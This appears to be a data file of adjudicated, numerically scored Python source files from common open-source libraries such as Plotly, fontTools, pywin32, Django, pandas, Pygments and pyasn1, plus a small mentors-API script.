families, separated by<<NEWL>>                commas, to indicate the preference in which to<<NEWL>>                apply fonts if they aren't available on the<<NEWL>>                system. The Chart Studio Cloud (at<<NEWL>>                https://chart-studio.plotly.com or on-premise)<<NEWL>>                generates images on a server, where only a<<NEWL>>                select number of fonts are installed and<<NEWL>>                supported. These include ""Arial"", ""Balto"",<<NEWL>>                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",<<NEWL>>                ""Droid Sans Mono"", ""Gravitas One"", ""Old<<NEWL>>                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans<<NEWL>>                Narrow"", ""Raleway"", ""Times New Roman"".<<NEWL>>            familysrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `family`.<<NEWL>>            size<<NEWL>><<NEWL>>            sizesrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `size`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
336	adjudicated	2	"from fontTools.pens.basePen import BasePen<<NEWL>>from reportlab.graphics.shapes import Path<<NEWL>><<NEWL>><<NEWL>>__all__ = [""ReportLabPen""]<<NEWL>><<NEWL>><<NEWL>>class ReportLabPen(BasePen):<<NEWL>><<NEWL>>    """"""A pen for drawing onto a ``reportlab.graphics.shapes.Path`` object.""""""<<NEWL>><<NEWL>>    def __init__(self, glyphSet, path=None):<<NEWL>>        BasePen.__init__(self, glyphSet)<<NEWL>>        if path is None:<<NEWL>>            path = Path()<<NEWL>>        self.path = path<<NEWL>><<NEWL>>    def _moveTo(self, p):<<NEWL>>        (x, y) = p<<NEWL>>        self.path.moveTo(x, y)<<NEWL>><<NEWL>>    def _lineTo(self, p):<<NEWL>>        (x, y) = p<<NEWL>>        self.path.lineTo(x, y)<<NEWL>><<NEWL>>    def _curveToOne(self, p1, p2, p3):<<NEWL>>        (x1, y1) = p1<<NEWL>>        (x2, y2) = p2<<NEWL>>        (x3, y3) = p3<<NEWL>>        self.path.curveTo(x1, y1, x2, y2, x3, y3)<<NEWL>><<NEWL>>    def _closePath(self):<<NEWL>>        self.path.closePath()<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    import sys<<NEWL>><<NEWL>>    if len(sys.argv) < 3:<<NEWL>>        print(<<NEWL>>            ""Usage: reportLabPen.py <OTF/TTF font> <glyphname> [<image file to create>]""<<NEWL>>        )<<NEWL>>        print(<<NEWL>>            ""  If no image file name is created, by default <glyphname>.png is created.""<<NEWL>>        )<<NEWL>>        print(""  example: reportLabPen.py Arial.TTF R test.png"")<<NEWL>>        print(<<NEWL>>            ""  (The file format will be PNG, regardless of the image file name supplied)""<<NEWL>>        )<<NEWL>>        sys.exit(0)<<NEWL>><<NEWL>>    from fontTools.ttLib import TTFont<<NEWL>>    from reportlab.lib import colors<<NEWL>><<NEWL>>    path = sys.argv[1]<<NEWL>>    glyphName = sys.argv[2]<<NEWL>>    if len(sys.argv) > 3:<<NEWL>>        imageFile = sys.argv[3]<<NEWL>>    else:<<NEWL>>        imageFile = ""%s.png"" % glyphName<<NEWL>><<NEWL>>    font = TTFont(path)  # it would work just as well with fontTools.t1Lib.T1Font<<NEWL>>    gs = font.getGlyphSet()<<NEWL>>    pen = ReportLabPen(gs, Path(fillColor=colors.red, strokeWidth=5))<<NEWL>>    g = gs[glyphName]<<NEWL>>    g.draw(pen)<<NEWL>><<NEWL>>    w, h = g.width, 1000<<NEWL>>    from reportlab.graphics import renderPM<<NEWL>>    from reportlab.graphics.shapes import Group, Drawing, scale<<NEWL>><<NEWL>>    # Everything is wrapped in a group to allow transformations.<<NEWL>>    g = Group(pen.path)<<NEWL>>    g.translate(0, 200)<<NEWL>>    g.scale(0.3, 0.3)<<NEWL>><<NEWL>>    d = Drawing(w, h)<<NEWL>>    d.add(g)<<NEWL>><<NEWL>>    renderPM.drawToFile(d, imageFile, fmt=""PNG"")"
276	adjudicated	4	"# Kills a process by process name<<NEWL>>#<<NEWL>># Uses the Performance Data Helper to locate the PID, then kills it.<<NEWL>># Will only kill the process if there is only one process of that name<<NEWL>># (eg, attempting to kill ""Python.exe"" will only work if there is only<<NEWL>># one Python.exe running.  (Note that the current process does not<<NEWL>># count - ie, if Python.exe is hosting this script, you can still kill<<NEWL>># another Python.exe (as long as there is only one other Python.exe)<<NEWL>><<NEWL>># Really just a demo for the win32pdh(util) module, which allows you<<NEWL>># to get all sorts of information about a running process and many<<NEWL>># other aspects of your system.<<NEWL>><<NEWL>>import win32api, win32pdhutil, win32con, sys<<NEWL>><<NEWL>><<NEWL>>def killProcName(procname):<<NEWL>>    # Change suggested by Dan Knierim, who found that this performed a<<NEWL>>    # ""refresh"", allowing us to kill processes created since this was run<<NEWL>>    # for the first time.<<NEWL>>    try:<<NEWL>>        win32pdhutil.GetPerformanceAttributes(""Process"", ""ID Process"", procname)<<NEWL>>    except:<<NEWL>>        pass<<NEWL>><<NEWL>>    pids = win32pdhutil.FindPerformanceAttributesByName(procname)<<NEWL>><<NEWL>>    # If _my_ pid in there, remove it!<<NEWL>>    try:<<NEWL>>        pids.remove(win32api.GetCurrentProcessId())<<NEWL>>    except ValueError:<<NEWL>>        pass<<NEWL>><<NEWL>>    if len(pids) == 0:<<NEWL>>        result = ""Can't find %s"" % procname<<NEWL>>    elif len(pids) > 1:<<NEWL>>        result = ""Found too many %s's - pids=`%s`"" % (procname, pids)<<NEWL>>    else:<<NEWL>>        handle = win32api.OpenProcess(win32con.PROCESS_TERMINATE, 0, pids[0])<<NEWL>>        win32api.TerminateProcess(handle, 0)<<NEWL>>        win32api.CloseHandle(handle)<<NEWL>>        result = """"<<NEWL>><<NEWL>>    return result<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    if len(sys.argv) > 1:<<NEWL>>        for procname in sys.argv[1:]:<<NEWL>>            result = killProcName(procname)<<NEWL>>            if result:<<NEWL>>                print(result)<<NEWL>>                print(""Dumping all processes..."")<<NEWL>>                win32pdhutil.ShowAllProcesses()<<NEWL>>            else:<<NEWL>>                print(""Killed %s"" % procname)<<NEWL>>    else:<<NEWL>>        print(""Usage: killProcName.py procname ..."")"
227	adjudicated	3	"# Copyright 2019 Google, LLC.<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#    http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>># [START cloudrun_broken_service]<<NEWL>># [START run_broken_service]<<NEWL>>import json<<NEWL>>import os<<NEWL>><<NEWL>>from flask import Flask<<NEWL>><<NEWL>><<NEWL>>app = Flask(__name__)<<NEWL>><<NEWL>><<NEWL>>@app.route(""/"", methods=[""GET""])<<NEWL>>def index():<<NEWL>>    print(""hello: received request."")<<NEWL>><<NEWL>>    # [START cloudrun_broken_service_problem]<<NEWL>>    # [START run_broken_service_problem]<<NEWL>>    NAME = os.getenv(""NAME"")<<NEWL>><<NEWL>>    if not NAME:<<NEWL>>        print(""Environment validation failed."")<<NEWL>>        raise Exception(""Missing required service parameter."")<<NEWL>>    # [END run_broken_service_problem]<<NEWL>>    # [END cloudrun_broken_service_problem]<<NEWL>><<NEWL>>    return f""Hello {NAME}""<<NEWL>><<NEWL>><<NEWL>># [END run_broken_service]<<NEWL>># [END cloudrun_broken_service]<<NEWL>><<NEWL>><<NEWL>>@app.route(""/improved"", methods=[""GET""])<<NEWL>>def improved():<<NEWL>>    print(""hello: received request."")<<NEWL>><<NEWL>>    # [START cloudrun_broken_service_upgrade]<<NEWL>>    # [START run_broken_service_upgrade]<<NEWL>>    NAME = os.getenv(""NAME"")<<NEWL>><<NEWL>>    if not NAME:<<NEWL>>        NAME = ""World""<<NEWL>>        error_message = {<<NEWL>>            ""severity"": ""WARNING"",<<NEWL>>            ""message"": f""NAME not set, default to {NAME}"",<<NEWL>>        }<<NEWL>>        print(json.dumps(error_message))<<NEWL>>    # [END run_broken_service_upgrade]<<NEWL>>    # [END cloudrun_broken_service_upgrade]<<NEWL>><<NEWL>>    return f""Hello {NAME}""<<NEWL>><<NEWL>><<NEWL>># [START cloudrun_broken_service]<<NEWL>># [START run_broken_service]<<NEWL>>if __name__ == ""__main__"":<<NEWL>>    PORT = int(os.getenv(""PORT"")) if os.getenv(""PORT"") else 8080<<NEWL>><<NEWL>>    # This is used when running locally. Gunicorn is used to run the<<NEWL>>    # application on Cloud Run. See entrypoint in Dockerfile.<<NEWL>>    app.run(host=""127.0.0.1"", port=PORT, debug=True)<<NEWL>># [END run_broken_service]<<NEWL>># [END cloudrun_broken_service]"
429	adjudicated	1	"from django.apps import apps<<NEWL>>from django.conf import settings<<NEWL>>from django.contrib.redirects.models import Redirect<<NEWL>>from django.contrib.sites.shortcuts import get_current_site<<NEWL>>from django.core.exceptions import ImproperlyConfigured<<NEWL>>from django.http import HttpResponseGone, HttpResponsePermanentRedirect<<NEWL>>from django.utils.deprecation import MiddlewareMixin<<NEWL>><<NEWL>><<NEWL>>class RedirectFallbackMiddleware(MiddlewareMixin):<<NEWL>>    # Defined as class-level attributes to be subclassing-friendly.<<NEWL>>    response_gone_class = HttpResponseGone<<NEWL>>    response_redirect_class = HttpResponsePermanentRedirect<<NEWL>><<NEWL>>    def __init__(self, get_response):<<NEWL>>        if not apps.is_installed(""django.contrib.sites""):<<NEWL>>            raise ImproperlyConfigured(<<NEWL>>                ""You cannot use RedirectFallbackMiddleware when ""<<NEWL>>                ""django.contrib.sites is not installed.""<<NEWL>>            )<<NEWL>>        super().__init__(get_response)<<NEWL>><<NEWL>>    def process_response(self, request, response):<<NEWL>>        # No need to check for a redirect for non-404 responses.<<NEWL>>        if response.status_code != 404:<<NEWL>>            return response<<NEWL>><<NEWL>>        full_path = request.get_full_path()<<NEWL>>        current_site = get_current_site(request)<<NEWL>><<NEWL>>        r = None<<NEWL>>        try:<<NEWL>>            r = Redirect.objects.get(site=current_site, old_path=full_path)<<NEWL>>        except Redirect.DoesNotExist:<<NEWL>>            pass<<NEWL>>        if r is None and settings.APPEND_SLASH and not request.path.endswith(""/""):<<NEWL>>            try:<<NEWL>>                r = Redirect.objects.get(<<NEWL>>                    site=current_site,<<NEWL>>                    old_path=request.get_full_path(force_append_slash=True),<<NEWL>>                )<<NEWL>>            except Redirect.DoesNotExist:<<NEWL>>                pass<<NEWL>>        if r is not None:<<NEWL>>            if r.new_path == """":<<NEWL>>                return self.response_gone_class()<<NEWL>>            return self.response_redirect_class(r.new_path)<<NEWL>><<NEWL>>        # No redirect was found. Return the response.<<NEWL>>        return response"
478	adjudicated	2	"import numpy as np<<NEWL>>import pytest<<NEWL>><<NEWL>>import pandas as pd<<NEWL>>import pandas._testing as tm<<NEWL>>from pandas.arrays import BooleanArray<<NEWL>>from pandas.tests.arrays.masked_shared import ComparisonOps<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def data():<<NEWL>>    """"""Fixture returning boolean array with valid and missing data""""""<<NEWL>>    return pd.array(<<NEWL>>        [True, False] * 4 + [np.nan] + [True, False] * 44 + [np.nan] + [True, False],<<NEWL>>        dtype=""boolean"",<<NEWL>>    )<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def dtype():<<NEWL>>    """"""Fixture returning BooleanDtype""""""<<NEWL>>    return pd.BooleanDtype()<<NEWL>><<NEWL>><<NEWL>>class TestComparisonOps(ComparisonOps):<<NEWL>>    def test_compare_scalar(self, data, comparison_op):<<NEWL>>        self._compare_other(data, comparison_op, True)<<NEWL>><<NEWL>>    def test_compare_array(self, data, comparison_op):<<NEWL>>        other = pd.array([True] * len(data), dtype=""boolean"")<<NEWL>>        self._compare_other(data, comparison_op, other)<<NEWL>>        other = np.array([True] * len(data))<<NEWL>>        self._compare_other(data, comparison_op, other)<<NEWL>>        other = pd.Series([True] * len(data))<<NEWL>>        self._compare_other(data, comparison_op, other)<<NEWL>><<NEWL>>    @pytest.mark.parametrize(""other"", [True, False, pd.NA])<<NEWL>>    def test_scalar(self, other, comparison_op, dtype):<<NEWL>>        ComparisonOps.test_scalar(self, other, comparison_op, dtype)<<NEWL>><<NEWL>>    def test_array(self, comparison_op):<<NEWL>>        op = comparison_op<<NEWL>>        a = pd.array([True] * 3 + [False] * 3 + [None] * 3, dtype=""boolean"")<<NEWL>>        b = pd.array([True, False, None] * 3, dtype=""boolean"")<<NEWL>><<NEWL>>        result = op(a, b)<<NEWL>><<NEWL>>        values = op(a._data, b._data)<<NEWL>>        mask = a._mask | b._mask<<NEWL>>        expected = BooleanArray(values, mask)<<NEWL>>        tm.assert_extension_array_equal(result, expected)<<NEWL>><<NEWL>>        # ensure we haven't mutated anything inplace<<NEWL>>        result[0] = None<<NEWL>>        tm.assert_extension_array_equal(<<NEWL>>            a, pd.array([True] * 3 + [False] * 3 + [None] * 3, dtype=""boolean"")<<NEWL>>        )<<NEWL>>        tm.assert_extension_array_equal(<<NEWL>>            b, pd.array([True, False, None] * 3, dtype=""boolean"")<<NEWL>>        )"
468	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""hoverlabel"", parent_name=""scatter3d"", **kwargs):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
439	adjudicated	3	from __future__ import unicode_literals<<NEWL>><<NEWL>># For backwards-compatibility. keep this file.<<NEWL>># (Many people are going to have key bindings that rely on this file.)<<NEWL>>from .app import *<<NEWL>><<NEWL>>__all__ = [<<NEWL>>    # Old names.<<NEWL>>    'HasArg',<<NEWL>>    'HasCompletions',<<NEWL>>    'HasFocus',<<NEWL>>    'HasSelection',<<NEWL>>    'HasValidationError',<<NEWL>>    'IsDone',<<NEWL>>    'IsReadOnly',<<NEWL>>    'IsMultiline',<<NEWL>>    'RendererHeightIsKnown',<<NEWL>>    'InEditingMode',<<NEWL>>    'InPasteMode',<<NEWL>><<NEWL>>    'ViMode',<<NEWL>>    'ViNavigationMode',<<NEWL>>    'ViInsertMode',<<NEWL>>    'ViInsertMultipleMode',<<NEWL>>    'ViReplaceMode',<<NEWL>>    'ViSelectionMode',<<NEWL>>    'ViWaitingForTextObjectMode',<<NEWL>>    'ViDigraphMode',<<NEWL>><<NEWL>>    'EmacsMode',<<NEWL>>    'EmacsInsertMode',<<NEWL>>    'EmacsSelectionMode',<<NEWL>><<NEWL>>    'IsSearching',<<NEWL>>    'HasSearch',<<NEWL>>    'ControlIsSearchable',<<NEWL>>]<<NEWL>><<NEWL>># Keep the original classnames for backwards compatibility.<<NEWL>>HasValidationError = lambda: has_validation_error<<NEWL>>HasArg = lambda: has_arg<<NEWL>>IsDone = lambda: is_done<<NEWL>>RendererHeightIsKnown = lambda: renderer_height_is_known<<NEWL>>ViNavigationMode = lambda: vi_navigation_mode<<NEWL>>InPasteMode = lambda: in_paste_mode<<NEWL>>EmacsMode = lambda: emacs_mode<<NEWL>>EmacsInsertMode = lambda: emacs_insert_mode<<NEWL>>ViMode = lambda: vi_mode<<NEWL>>IsSearching = lambda: is_searching<<NEWL>>HasSearch = lambda: is_searching<<NEWL>>ControlIsSearchable = lambda: control_is_searchable<<NEWL>>EmacsSelectionMode = lambda: emacs_selection_mode<<NEWL>>ViDigraphMode = lambda: vi_digraph_mode<<NEWL>>ViWaitingForTextObjectMode = lambda: vi_waiting_for_text_object_mode<<NEWL>>ViSelectionMode = lambda: vi_selection_mode<<NEWL>>ViReplaceMode = lambda: vi_replace_mode<<NEWL>>ViInsertMultipleMode = lambda: vi_insert_multiple_mode<<NEWL>>ViInsertMode = lambda: vi_insert_mode<<NEWL>>HasSelection = lambda: has_selection<<NEWL>>HasCompletions = lambda: has_completions<<NEWL>>IsReadOnly = lambda: is_read_only<<NEWL>>IsMultiline = lambda: is_multiline<<NEWL>><<NEWL>>HasFocus = has_focus  # No lambda here! (Has_focus is callable that returns a callable.)<<NEWL>>InEditingMode = in_editing_mode
237	adjudicated	3	#<<NEWL>># This file is part of pyasn1-modules software.<<NEWL>>#<<NEWL>># Created by Russ Housley with assistance from asn1ate v.0.6.0.<<NEWL>>#<<NEWL>># Copyright (c) 2019, Vigil Security, LLC<<NEWL>># License: http://snmplabs.com/pyasn1/license.html<<NEWL>>#<<NEWL>># CMS Encrypted Key Package Content Type<<NEWL>>#<<NEWL>># ASN.1 source from:<<NEWL>># https://www.rfc-editor.org/rfc/rfc6032.txt<<NEWL>>#<<NEWL>><<NEWL>>from pyasn1.type import namedtype<<NEWL>>from pyasn1.type import tag<<NEWL>>from pyasn1.type import univ<<NEWL>><<NEWL>>from pyasn1_modules import rfc5652<<NEWL>>from pyasn1_modules import rfc5083<<NEWL>><<NEWL>><<NEWL>># Content Decryption Key Identifier attribute<<NEWL>><<NEWL>>id_aa_KP_contentDecryptKeyID = univ.ObjectIdentifier('2.16.840.1.101.2.1.5.66')<<NEWL>><<NEWL>>class ContentDecryptKeyID(univ.OctetString):<<NEWL>>    pass<<NEWL>><<NEWL>>aa_content_decrypt_key_identifier = rfc5652.Attribute()<<NEWL>>aa_content_decrypt_key_identifier['attrType'] = id_aa_KP_contentDecryptKeyID<<NEWL>>aa_content_decrypt_key_identifier['attrValues'][0] = ContentDecryptKeyID()<<NEWL>><<NEWL>><<NEWL>># Encrypted Key Package Content Type<<NEWL>><<NEWL>>id_ct_KP_encryptedKeyPkg = univ.ObjectIdentifier('2.16.840.1.101.2.1.2.78.2')<<NEWL>><<NEWL>>class EncryptedKeyPackage(univ.Choice):<<NEWL>>    pass<<NEWL>><<NEWL>>EncryptedKeyPackage.componentType = namedtype.NamedTypes(<<NEWL>>    namedtype.NamedType('encrypted', rfc5652.EncryptedData()),<<NEWL>>    namedtype.NamedType('enveloped', rfc5652.EnvelopedData().subtype(<<NEWL>>        implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 0))),<<NEWL>>    namedtype.NamedType('authEnveloped', rfc5083.AuthEnvelopedData().subtype(<<NEWL>>        implicitTag=tag.Tag(tag.tagClassContext, tag.tagFormatSimple, 1)))<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>># Map of Attribute Type OIDs to Attributes are<<NEWL>># added to the ones that are in rfc5652.py<<NEWL>><<NEWL>>_cmsAttributesMapUpdate = {<<NEWL>>    id_aa_KP_contentDecryptKeyID: ContentDecryptKeyID(),<<NEWL>>}<<NEWL>><<NEWL>>rfc5652.cmsAttributesMap.update(_cmsAttributesMapUpdate)<<NEWL>><<NEWL>><<NEWL>># Map of Content Type OIDs to Content Types are<<NEWL>># added to the ones that are in rfc5652.py<<NEWL>><<NEWL>>_cmsContentTypesMapUpdate = {<<NEWL>>    id_ct_KP_encryptedKeyPkg: EncryptedKeyPackage(),<<NEWL>>}<<NEWL>><<NEWL>>rfc5652.cmsContentTypesMap.update(_cmsContentTypesMapUpdate)
377	adjudicated	1	"######################## BEGIN LICENSE BLOCK ########################<<NEWL>># The Original Code is mozilla.org code.<<NEWL>>#<<NEWL>># The Initial Developer of the Original Code is<<NEWL>># Netscape Communications Corporation.<<NEWL>># Portions created by the Initial Developer are Copyright (C) 1998<<NEWL>># the Initial Developer. All Rights Reserved.<<NEWL>>#<<NEWL>># Contributor(s):<<NEWL>>#   Mark Pilgrim - port to Python<<NEWL>>#<<NEWL>># This library is free software; you can redistribute it and/or<<NEWL>># modify it under the terms of the GNU Lesser General Public<<NEWL>># License as published by the Free Software Foundation; either<<NEWL>># version 2.1 of the License, or (at your option) any later version.<<NEWL>>#<<NEWL>># This library is distributed in the hope that it will be useful,<<NEWL>># but WITHOUT ANY WARRANTY; without even the implied warranty of<<NEWL>># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU<<NEWL>># Lesser General Public License for more details.<<NEWL>>#<<NEWL>># You should have received a copy of the GNU Lesser General Public<<NEWL>># License along with this library; if not, write to the Free Software<<NEWL>># Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA<<NEWL>># 02110-1301  USA<<NEWL>>######################### END LICENSE BLOCK #########################<<NEWL>><<NEWL>>from .chardistribution import EUCKRDistributionAnalysis<<NEWL>>from .codingstatemachine import CodingStateMachine<<NEWL>>from .mbcharsetprober import MultiByteCharSetProber<<NEWL>>from .mbcssm import CP949_SM_MODEL<<NEWL>><<NEWL>><<NEWL>>class CP949Prober(MultiByteCharSetProber):<<NEWL>>    def __init__(self):<<NEWL>>        super().__init__()<<NEWL>>        self.coding_sm = CodingStateMachine(CP949_SM_MODEL)<<NEWL>>        # NOTE: CP949 is a superset of EUC-KR, so the distribution should be<<NEWL>>        #       not different.<<NEWL>>        self.distribution_analyzer = EUCKRDistributionAnalysis()<<NEWL>>        self.reset()<<NEWL>><<NEWL>>    @property<<NEWL>>    def charset_name(self):<<NEWL>>        return ""CP949""<<NEWL>><<NEWL>>    @property<<NEWL>>    def language(self):<<NEWL>>        return ""Korean"""
266	adjudicated	1	"# Copyright (c) Meta Platforms, Inc. and affiliates.<<NEWL>>#<<NEWL>># This source code is licensed under the MIT license found in the<<NEWL>># LICENSE file in the root directory of this source tree.<<NEWL>><<NEWL>>from viktor._vendor.libcst._parser.grammar import _should_include<<NEWL>>from viktor._vendor.libcst._parser.parso.utils import PythonVersionInfo<<NEWL>>from viktor._vendor.libcst.testing.utils import data_provider, UnitTest<<NEWL>><<NEWL>><<NEWL>>class VersionCompareTest(UnitTest):<<NEWL>>    @data_provider(<<NEWL>>        (<<NEWL>>            # Simple equality<<NEWL>>            (""==3.6"", PythonVersionInfo(3, 6), True),<<NEWL>>            (""!=3.6"", PythonVersionInfo(3, 6), False),<<NEWL>>            # Equal or GT/LT<<NEWL>>            ("">=3.6"", PythonVersionInfo(3, 5), False),<<NEWL>>            ("">=3.6"", PythonVersionInfo(3, 6), True),<<NEWL>>            ("">=3.6"", PythonVersionInfo(3, 7), True),<<NEWL>>            (""<=3.6"", PythonVersionInfo(3, 5), True),<<NEWL>>            (""<=3.6"", PythonVersionInfo(3, 6), True),<<NEWL>>            (""<=3.6"", PythonVersionInfo(3, 7), False),<<NEWL>>            # GT/LT<<NEWL>>            ("">3.6"", PythonVersionInfo(3, 5), False),<<NEWL>>            ("">3.6"", PythonVersionInfo(3, 6), False),<<NEWL>>            ("">3.6"", PythonVersionInfo(3, 7), True),<<NEWL>>            (""<3.6"", PythonVersionInfo(3, 5), True),<<NEWL>>            (""<3.6"", PythonVersionInfo(3, 6), False),<<NEWL>>            (""<3.6"", PythonVersionInfo(3, 7), False),<<NEWL>>            # Multiple checks<<NEWL>>            ("">3.6,<3.8"", PythonVersionInfo(3, 6), False),<<NEWL>>            ("">3.6,<3.8"", PythonVersionInfo(3, 7), True),<<NEWL>>            ("">3.6,<3.8"", PythonVersionInfo(3, 8), False),<<NEWL>>        )<<NEWL>>    )<<NEWL>>    def test_tokenize(<<NEWL>>        self,<<NEWL>>        requested_version: str,<<NEWL>>        actual_version: PythonVersionInfo,<<NEWL>>        expected_result: bool,<<NEWL>>    ) -> None:<<NEWL>>        self.assertEqual(<<NEWL>>            _should_include(requested_version, actual_version), expected_result<<NEWL>>        )"
326	adjudicated	2	"""""""<<NEWL>>    pygments.lexers.pointless<<NEWL>>    ~~~~~~~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    Lexers for Pointless.<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.lexer import RegexLexer, words<<NEWL>>from pygments.token import Comment, Error, Keyword, Name, Number, Operator, \<<NEWL>>    Punctuation, String, Text<<NEWL>><<NEWL>>__all__ = ['PointlessLexer']<<NEWL>><<NEWL>><<NEWL>>class PointlessLexer(RegexLexer):<<NEWL>>    """"""<<NEWL>>    For Pointless source code.<<NEWL>><<NEWL>>    .. versionadded:: 2.7<<NEWL>>    """"""<<NEWL>><<NEWL>>    name = 'Pointless'<<NEWL>>    url = 'https://ptls.dev'<<NEWL>>    aliases = ['pointless']<<NEWL>>    filenames = ['*.ptls']<<NEWL>><<NEWL>>    ops = words([<<NEWL>>        ""+"", ""-"", ""*"", ""/"", ""**"", ""%"", ""+="", ""-="", ""*="",<<NEWL>>        ""/="", ""**="", ""%="", ""|>"", ""="", ""=="", ""!="", ""<"", "">"",<<NEWL>>        ""<="", "">="", ""=>"", ""$"", ""++"",<<NEWL>>    ])<<NEWL>><<NEWL>>    keywords = words([<<NEWL>>        ""if"", ""then"", ""else"", ""where"", ""with"", ""cond"",<<NEWL>>        ""case"", ""and"", ""or"", ""not"", ""in"", ""as"", ""for"",<<NEWL>>        ""requires"", ""throw"", ""try"", ""catch"", ""when"",<<NEWL>>        ""yield"", ""upval"",<<NEWL>>    ], suffix=r'\b')<<NEWL>><<NEWL>>    tokens = {<<NEWL>>        'root': [<<NEWL>>            (r'[ \n\r]+', Text),<<NEWL>>            (r'--.*$', Comment.Single),<<NEWL>>            (r'""""""', String, 'multiString'),<<NEWL>>            (r'""', String, 'string'),<<NEWL>>            (r'[\[\](){}:;,.]', Punctuation),<<NEWL>>            (ops, Operator),<<NEWL>>            (keywords, Keyword),<<NEWL>>            (r'\d+|\d*\.\d+', Number),<<NEWL>>            (r'(true|false)\b', Name.Builtin),<<NEWL>>            (r'[A-Z][a-zA-Z0-9]*\b', String.Symbol),<<NEWL>>            (r'output\b', Name.Variable.Magic),<<NEWL>>            (r'(export|import)\b', Keyword.Namespace),<<NEWL>>            (r'[a-z][a-zA-Z0-9]*\b', Name.Variable)<<NEWL>>        ],<<NEWL>>        'multiString': [<<NEWL>>            (r'\\.', String.Escape),<<NEWL>>            (r'""""""', String, '#pop'),<<NEWL>>            (r'""', String),<<NEWL>>            (r'[^\\""]+', String),<<NEWL>>        ],<<NEWL>>        'string': [<<NEWL>>            (r'\\.', String.Escape),<<NEWL>>            (r'""', String, '#pop'),<<NEWL>>            (r'\n', Error),<<NEWL>>            (r'[^\\""]+', String),<<NEWL>>        ],<<NEWL>>    }"
104	adjudicated	0	"from environs import Env<<NEWL>><<NEWL>>from api import MentorsAPI<<NEWL>><<NEWL>><<NEWL>>def main() -> None:<<NEWL>>    env = Env()<<NEWL>>    env.read_env()<<NEWL>><<NEWL>>    mentors_api = MentorsAPI(env.str('DVMN_USERNAME'), env.str('DVMN_PASSWORD'))<<NEWL>>    mentor_uuid = env.str('MENTOR_UUID')<<NEWL>><<NEWL>>    orders = mentors_api.get_mentor_orders(mentor_uuid)<<NEWL>><<NEWL>>    for order in orders:<<NEWL>>        if not order['is_active']:<<NEWL>>            continue<<NEWL>><<NEWL>>        notes = order['student']['notes']<<NEWL>>        proj_notes = [<<NEWL>>            n for n in notes if <<NEWL>>            'ÐÐ° Ð¿ÑÐ¾ÐµÐºÑÐµ' in n['content']<<NEWL>>            and not n['is_hidden']<<NEWL>>        ]<<NEWL>>        if not proj_notes:<<NEWL>>            continue<<NEWL>><<NEWL>>        tasks = mentors_api.get_study_program_by_order_uuid(order['uuid'])<<NEWL>>        project_task = None<<NEWL>>        for task in tasks:<<NEWL>>            if any([<<NEWL>>                'ÐÐ¾Ð¼Ð°Ð½Ð´Ð½ÑÐµ Ð¿ÑÐ¾ÐµÐºÑÑ' not in task['trainer']['title'],<<NEWL>>                task['is_completed']<<NEWL>>            ]):<<NEWL>>                continue<<NEWL>><<NEWL>>            project_task = task<<NEWL>>            break<<NEWL>>        <<NEWL>>        if not project_task:<<NEWL>>            print(f'Ð£ÑÐµÐ½Ð¸ÐºÑ: {order[""uuid""]} Ð½Ðµ Ð²ÑÐ´Ð°Ð½ 